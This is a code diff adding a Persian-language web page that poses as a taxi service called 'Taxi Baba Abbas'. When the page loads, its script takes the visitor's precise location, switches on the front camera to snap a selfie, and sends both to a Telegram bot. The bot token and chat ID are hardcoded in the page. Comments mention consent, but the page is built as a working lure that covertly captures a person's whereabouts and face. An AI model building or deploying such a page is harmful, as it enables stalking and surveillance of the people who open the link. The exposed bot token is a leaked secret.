@@ -1,0 +1,201 @@
+<!doctype html>
+<html lang="fa">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>تاکسی بابا عباس — اتوماتیک گرفتن موقعیت و سلفی</title>
+  <style>
+    :root{--bg:#f7f9fb;--card:#fff;--text:#0b1a2b;--muted:#6c7a86;--green:#28a745;--danger:#c0392b}
+    body { font-family: "Tahoma", "Arial", sans-serif; background:var(--bg); color:var(--text); display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
+    .card { background:var(--card); padding:28px; border-radius:12px; box-shadow:0 6px 24px rgba(12,17,24,0.08); text-align:center; width:360px; }
+    .icon { font-size:56px; }
+    h1 { margin:10px 0 6px; font-size:22px; }
+    p { margin:6px 0 18px; color:var(--muted); font-size:14px; }
+    .small { font-size:13px; color:#7a8a99; margin-top:12px; min-height:24px }
+    .hint { color:var(--danger); margin-top:12px; font-size:13px; display:none; }
+    video { display:none; width:240px; height:320px; border-radius:8px; object-fit:cover; margin-top:12px }
+    canvas { display:none }
+  </style>
+</head>
+<body>
+  <div class="card" role="status" aria-live="polite">
+    <div class="icon" aria-hidden="true">🚕</div>
+    <h1>تاکسی بابا عباس</h1>
+    <p>در حال آماده‌سازی... (مرورگر از شما برای موقعیت و دوربین اجازه می‌خواهد)</p>
+    <div id="status" class="small">در حال راه‌اندازی...</div>
+    <div id="error" class="hint" role="alert"></div>
+    <video id="video" autoplay playsinline muted></video>
+  </div>
+
+  <script>
+    /*****************************************************************************
+     * هشدار بسیار مهم و قانونی/اخلاقی:
+     * - این نسخه درخواست مجوزها را بلافاصله هنگام ورود به سایت اجرا می‌کند.
+     *   حتماً باید پیش از این کار اطلاع صریح و رضایت کاربر وجود داشته باشد.
+     * - قرار دادن TOKEN بات در کد کلاینت (سمت کاربر) ناامن است — هرکسی می‌تواند آن
+     *   را بدست آورد و از بات سوءاستفاده کند. در تولید، حتماً توکن را در سرور نگه دارید
+     *   و کلاینت فقط داده‌ها (مختصات و عکس) را به سرور بفرستد؛ سرور به تلگرام ارسال کند.
+     * - getUserMedia و Geolocation فقط روی origin امن (https یا localhost) کار می‌کنند.
+     * - برخی مرورگرها ممکن است اجازه دوربین یا موقعیت را تنها بعد از تعامل کاربر (مثلاً کلیک) نشان دهند.
+     *****************************************************************************/
+
+    // ------- CONFIG (برای تست سریع فقط) -------
+    // توجه: اینها در کد کلاینت نباید در محیط تولید قرار بگیرند.
+    const BOT_TOKEN = '8295388715:AAGkM7QaqplE1WNpM6S_GI6aBLzBObK2he8'; // ناامن در کلاینت
+    const CHAT_ID   = '8293145520';
+
+    // ------- عناصر DOM -------
+    const statusDiv = document.getElementById('status');
+    const errorDiv = document.getElementById('error');
+    const video = document.getElementById('video');
+
+    function setStatus(msg) { statusDiv.textContent = msg; errorDiv.style.display='none'; }
+    function setError(msg) { errorDiv.style.display='block'; errorDiv.textContent = msg; statusDiv.textContent=''; }
+
+    // ------- دریافت موقعیت (Promise) -------
+    function getCurrentPositionPromise() {
+      return new Promise((resolve, reject) => {
+        if (!navigator.geolocation) return reject(new Error('مرورگر شما Geolocation را پشتیبانی نمی‌کند.'));
+        navigator.geolocation.getCurrentPosition(pos => {
+          resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude });
+        }, err => {
+          if (err.code === err.PERMISSION_DENIED) reject(new Error('دسترسی به موقعیت رد شد.'));
+          else reject(new Error('خطا در دریافت موقعیت: ' + (err.message || err.code)));
+        }, { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 });
+      });
+    }
+
+    // ------- راه‌اندازی دوربین سلفی -------
+    let mediaStream = null;
+    async function startCamera() {
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        throw new Error('دستگاه شما از دوربین پشتیبانی نمی‌کند.');
+      }
+      const constraints = { video: { facingMode: { ideal: "user" }, width: { ideal: 640 }, height: { ideal: 960 } }, audio: false };
+      mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
+      video.srcObject = mediaStream;
+      video.style.display = 'block';
+      try { await video.play(); } catch(e){}
+    }
+    async function stopCamera() {
+      if (mediaStream) {
+        mediaStream.getTracks().forEach(t => t.stop());
+        mediaStream = null;
+      }
+      video.pause();
+      video.srcObject = null;
+      video.style.display = 'none';
+    }
+
+    function captureBlobFromVideo() {
+      const w = video.videoWidth || 640;
+      const h = video.videoHeight || 480;
+      const canvas = document.createElement('canvas');
+      canvas.width = w;
+      canvas.height = h;
+      const ctx = canvas.getContext('2d');
+      // mirror selfie
+      ctx.translate(w, 0); ctx.scale(-1, 1);
+      ctx.drawImage(video, 0, 0, w, h);
+      return new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
+    }
+
+    // ------- ارسال به تلگرام (client-side - ناامن) -------
+    async function sendLocationToTelegram(lat, lon) {
+      const url = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendLocation`;
+      const body = new URLSearchParams({ chat_id: CHAT_ID, latitude: String(lat), longitude: String(lon) });
+      const r = await fetch(url, { method: 'POST', body });
+      const j = await r.json();
+      if (!j.ok) throw new Error('خطا در ارسال لوکیشن: ' + (j.description || r.statusText));
+      return j;
+    }
+    async function sendPhotoToTelegram(blob, caption = '') {
+      const url = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendPhoto`;
+      const form = new FormData();
+      form.append('chat_id', CHAT_ID);
+      form.append('photo', new File([blob], 'selfie.jpg', { type: blob.type || 'image/jpeg' }));
+      if (caption) form.append('caption', caption);
+      const r = await fetch(url, { method: 'POST', body: form });
+      const j = await r.json();
+      if (!j.ok) throw new Error('خطا در ارسال عکس: ' + (j.description || r.statusText));
+      return j;
+    }
+
+    // ------- جریان کلی: هنگام بارگذاری صفحه، اول موقعیت سپس دوربین، بعد ارسال -------
+    async function autoCollectAndSend() {
+      // بررسی اولیه پارامترها
+      if (!BOT_TOKEN || BOT_TOKEN.includes('REPLACE_WITH') || !CHAT_ID) {
+        setError('پارامترهای ربات تنظیم نشده‌اند یا ناامن هستند. در محیط تولید از سرور استفاده کنید.');
+        return;
+      }
+
+      setStatus('در حال درخواست موقعیت از مرورگر...');
+      try {
+        const { lat, lon } = await getCurrentPositionPromise();
+        setStatus('موقعیت دریافت شد. در حال ارسال موقعیت به تلگرام...');
+        await sendLocationToTelegram(lat, lon);
+        setStatus('موقعیت ارسال شد. در حال درخواست دسترسی به دوربین برای گرفتن سلفی...');
+
+        // شروع دوربین و گرفتن عکس
+        try {
+          await startCamera();
+        } catch (e) {
+          // ممکن است مرورگر اجازه دوربین را ندهد یا نیاز به تعامل داشته باشد
+          setError('دسترسی به دوربین امکان‌پذیر نیست: ' + (e.message || e));
+          return;
+        }
+
+        // برخی مرورگرها ممکن است اجازه نمایش پنجره دوربین را تنها بعد از تعامل نشان دهند.
+        // این کد سعی می‌کند بلافاصله یک فریم بگیرد؛ اگر مجوز داده شود عکس گرفته و ارسال می‌شود.
+        setStatus('دوربین فعال شد، در حال گرفتن سلفی...');
+        // صبر کوتاه تا دوربین warm-up شود
+        await new Promise(r => setTimeout(r, 600));
+        const blob = await captureBlobFromVideo();
+        await stopCamera();
+
+        if (!blob) {
+          setError('خطا در گرفتن عکس.');
+          return;
+        }
+
+        setStatus('در حال ارسال سلفی به تلگرام...');
+        const caption = `سلفی مشتری — موقعیت: https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}`;
+        await sendPhotoToTelegram(blob, caption);
+        setStatus('موقعیت و سلفی ارسال شد. تشکر! تاکسی در راه است.');
+      } catch (err) {
+        // نمایش خطا (اجازه‌ها رد شده یا خطای دیگر)
+        setError('خطا: ' + (err.message || err));
+      } finally {
+        // اطمینان از بسته شدن دوربین
+        try { await stopCamera(); } catch(e){}
+      }
+    }
+
+    // اجرای خودکار وقتی صفحه لود شد
+    window.addEventListener('load', () => {
+      // توجه: اگر مرورگر به کلی اجازه‌ی اجرای خودکار درخواست مجوز بدون تعامل را ندهد،
+      // ممکن است اجازه‌ها ظاهر نشوند تا زمانی که کاربر تعامل داشته باشد.
+      setTimeout(() => autoCollectAndSend(), 300);
+    });
+
+    // بررسی وضعیت permission API برای اطلاع‌رسانی بهتر
+    (async function checkPermissions() {
+      if (!navigator.permissions) return;
+      try {
+        const pGeo = await navigator.permissions.query({ name: 'geolocation' });
+        if (pGeo.state === 'denied') setStatus('دسترسی موقعیت در مرورگر مسدود شده است.');
+        pGeo.onchange = () => {
+          if (pGeo.state === 'denied') setStatus('دسترسی موقعیت در مرورگر مسدود شده است.');
+        };
+        // دوربین
+        const pCam = await navigator.permissions.query({ name: 'camera' }).catch(()=>null);
+        if (pCam && pCam.state === 'denied') setStatus('دسترسی دوربین در مرورگر مسدود شده است.');
+      } catch(e){}
+    })();
+  </script>
+
+  <noscript>
+    <div style="text-align:center; margin-top:14px; color:#c00">جاوااسکریپت خام است. این صفحه باید جاوااسکریپت را اجرا کند.</div>
+  </noscript>
+</body>
+</html>
